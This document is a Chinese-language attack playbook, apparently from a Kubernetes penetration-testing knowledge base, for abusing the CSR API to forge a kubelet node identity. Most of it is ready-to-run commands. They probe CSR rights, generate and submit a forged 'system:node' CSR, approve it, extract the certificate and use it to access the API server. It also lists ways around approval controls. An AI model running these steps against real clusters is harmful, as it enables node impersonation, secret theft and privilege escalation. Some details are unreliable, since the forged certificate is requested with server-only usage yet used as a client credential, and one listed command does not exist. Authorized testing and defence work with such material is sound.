---
source: manual
confidence: medium
platforms: [k8s]
required_tools: []
execution_contexts: [L0, L1, L2]
max_verification_level: L2
destructive: false
mapped_attack_surfaces: [AS-2.10]
mapped_compliance_families: [RBAC配置, 证书管理]
---

# csr-api-abuse — CSR API 滥用伪造节点身份

攻击者利用 `certificatesigningrequests/create` 权限或有效的 bootstrap token，向集群提交伪造节点身份的 Certificate Signing Request，骗取 CA 签发 kubelet 客户端证书冒充节点，进而以节点身份窃取工作负载 Secret 或执行恶意控制。

---

## 1. 前置条件

- 当前身份被授予 `certificatesigningrequests/create` 权限（kubectl auth can-i create csr）
- 或持有有效的 bootstrap token（kubeadm join 流程的自动审批）
- CSR 审批者签名权宽松（自动批准策略或攻击者同时持有 approve 权限）
- 集群启用 Node.authorizer（节点身份认证模式）

检查命令：
```bash
# [L0] 检查当前身份是否可创建 CSR
kubectl auth can-i create certificatesigningrequests
# 期望输出: yes

# [L0] 检查当前身份是否可审批 CSR
kubectl auth can-i approve certificatesigningrequests
# 期望输出: yes（若 yes 攻击路径闭环，若 no 需借助 auto-approve）
```

## 2. 探测命令

```bash
# [L0] 验证是否有 CSR 创建权限
kubectl auth can-i create certificatesigningrequests.certificates.k8s.io
# 期望输出: yes

# [L0] 列出现有 CSR 列表及状态
kubectl get csr
# 期望输出: Pending/Approved/Denied 状态的 CSR 列表

# [L0] 检查是否有自动批准 CSR 的 signer（kubelet-serving 存在自动审批）
kubectl get csr -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.signerName}{"\t"}{.status.certificate}{end}'
# 期望输出: 含 kubernetes.io/kubelet-serving signer 且 status.certificate 非空表示已签发

# [L0] 检查是否有 bootstrap token 有效
kubectl -n kube-system get secret | grep bootstrap
# 期望输出: bootstrap-token-<id> Secret（已创建且未过期）

# [L0] 检查集群是否配置 Node 自动批准
ps aux | grep kube-controller-manager | grep -oE 'cluster-signing-\S+'
# 期望输出: --cluster-signing-cert-file 等参数 → CSR 自动批准可能启用
```

## 3. 攻击验证

```bash
# [L2] 攻击准备：生成伪造节点的私钥与 CSR
openssl genrsa -out /tmp/fake-node.key 2048
# 期望输出: 无报错

openssl req -new -key /tmp/fake-node.key -out /tmp/fake-node.csr \
  -subj "/O=system:nodes/CN=system:node:fake-node-poc"
# 期望输出: 无报错

# [L2] 攻击验证：将 CSR 编码为 base64 提交到 API Server
CSR_BASE64=$(base64 /tmp/fake-node.csr | tr -d '\n')
cat > /tmp/fake-node-csr.yaml <<EOF
apiVersion: certificates.k8s.io/v1
kind: CertificateSigningRequest
metadata:
  name: fake-node-poc
spec:
  signerName: kubernetes.io/kubelet-serving
  groups:
  - system:nodes
  usages:
  - digital signature
  - key encipherment
  - server auth
  request: ${CSR_BASE64}
EOF

kubectl apply -f /tmp/fake-node-csr.yaml
# 期望输出: certificatesigningrequest.certificates.k8s.io/fake-node-poc created

# [L2] 攻击验证：审批 CSR（若有 approve 权限）
kubectl certificate approve fake-node-poc
# 期望输出: certificatesigningrequest.certificates.k8s.io/fake-node-poc approved

# [L2] 攻击验证：下载已签发的证书
kubectl get csr fake-node-poc -o jsonpath='{.status.certificate}' | base64 -d > /tmp/fake-node.crt
# 期望输出: 无报错

# [L2] 攻击验证：使用伪造节点证书冒充节点 kubelet 身份
kubectl --kubeconfig=/dev/null \
  --server=https://<apiserver>:6443 \
  --certificate-authority=/etc/kubernetes/pki/ca.crt \
  --client-certificate=/tmp/fake-node.crt \
  --client-key=/tmp/fake-node.key \
  get pods -A 2>&1 | head -5
# 期望输出: 列出全部 Pod（节点身份可见调度到本节点的 Pod）

# [L2] 宿主机端确认：CSR 列表出现伪造记录
kubectl get csr fake-node-poc
# 期望输出: fake-node-poc ... Approved,Issued

# [L2] 清理
kubectl delete csr fake-node-poc
rm /tmp/fake-node.key /tmp/fake-node.csr /tmp/fake-node.crt /tmp/fake-node-csr.yaml
# 期望输出: 无报错
```

## 4. 差分证明

```bash
# [L0] 攻击前环境快照：CSR 列表
kubectl get csr --no-headers | wc -l
# 期望输出: 攻击前 CSR 数量 N

# [L0] 攻击后环境对比：CSR 数量增加
kubectl get csr --no-headers | wc -l
# 期望输出: N+1（新增 fake-node-poc）

# [L0] 攻击前：无伪造节点证书文件
ls /tmp/fake-node.* 2>&1
# 期望输出: No such file

# [L2] 攻击后：伪造证书成功签发
openssl x509 -in /tmp/fake-node.crt -noout -subject -issuer
# 期望输出: subject=/O=system:nodes/CN=system:node:fake-node-poc
#         issuer=/CN=kubernetes → 用集群 CA 签发

# [L2] 攻击前：用伪造凭据访问 API Server 失败
kubectl --server=https://<apiserver>:6443 --client-certificate=/tmp/fake-node.crt --client-key=/tmp/fake-node.key get pods 2>&1
# 期望输出: 证书无效或 Forbidden

# [L2] 攻击后：用签发的伪造证书访问 API Server 成功
kubectl --server=https://<apiserver>:6443 --client-certificate=/tmp/fake-node.crt --client-key=/tmp/fake-node.key --certificate-authority=/etc/kubernetes/pki/ca.crt get pods 2>&1
# 期望输出: Pod 列表 → 证明 CSR 滥用成功冒充节点身份
```

差分结论：攻击前无可信节点凭据无法冒充节点，攻击后通过 CSR API 提交伪造节点身份并获签发证书，成功以节点身份访问 API Server，证明 CSR API 滥用。

## 5. 绕过策略

```bash
# [L1] 检查是否依赖自动批准 signer（无需 manual approve）
kubectl get csrspec 2>/dev/null; kubectl get csr -o jsonpath='{.spec.signerName}'
# 若 signerName=kubernetes.io/kubelet-serving 且配置了 kubelet-serving 自动批准规则 → 无需 approve 权限

# [L1] 检查 kube-controller-manager 是否启用 cluster-signing
ps aux | grep kube-controller-manager | grep -oE 'cluster-signing-(cert|key)-file=\S+'
# 若 cluster-signing 配置存在 → CSR 提交后部分自动批准

# 绕过方式：
# - [L1] 若无 approve 权限但有 create 权限且 kubelet-serving signer auto-approve 启用 → 提交后等待自动签发
# - [L2] 若 CSR 必须人工批准，攻击者同时窃取节点或 RBAC 漂移获得 approve 权限（高权限账户）
# - [L2] 若 signerName 受限不许用 kubelet-serving，尝试 kubernetes.io/kube-apiserver-client signer（用于客户端管理员证书）
# - [L1] 若 bootstrap token 有效，通过 token 自动通过审批（kubeadm join 流程）
```

## 6. 证伪条件

```bash
# [L0] 当前无创建 CSR 权限
kubectl auth can-i create certificatesigningrequests
# 输出: no → 证伪

# [L0] 无 bootstrap token 且无 CSR 创建权限
kubectl -n kube-system get secret | grep bootstrap
# 输出: 无 bootstrap-token Secret → 证伪源头之一

# [L2] CSR 提交后不被批准（人工审批且无 approve 权限）
kubectl describe csr <name> | grep -i 'fail\|denied'
# 输出: Status: Denied/Pending 无签发 → 证伪（路径不闭环）

# [L0] 集群未配置 cluster-signing 自动批准
ps aux | grep kube-controller-manager | grep -c 'cluster-signing'
# 输出: 0 → 证伪（无自动签发能力）

# [L1] 提交的 CSR 与 signerName 不匹配
kubectl apply -f fake-csr.yaml 2>&1
# 输出: signerName ... invalid → 证伪
```

## 7. 审批级别

- **L2** 攻击验证（生成密钥、提交 CSR、审批、下载证书冒充节点）→ **Level 4**（伪造节点身份，需人工确认）
- **L1** 资产权限探测（auth can-i、get csr）→ **Level 2**（只读探测，自动执行）
- **L0** 宿主机观察（ps 看控制器参数、get csr）→ **Level 1**（只读侦察，自动执行）
- 破坏性标注：否（仅创建临时 CSR 与证书，清理后还原）
- 最高验证层级：L2

## 8. MITRE ATT&CK

- **Tactic**: Defense Evasion / Persistence / Privilege Escalation
- **Technique ID**: T1606
- **Technique Name**: Forge Web Credentials
- **描述**: 攻击者通过滥用了证书签名请求（CSR）API，以伪造节点身份骗取集群 CA 签发有效 kubelet 证书，实现长期持久化的特权节点冒充访问，绕过 Node.authorizer 进行后续横向移动与凭证窃取。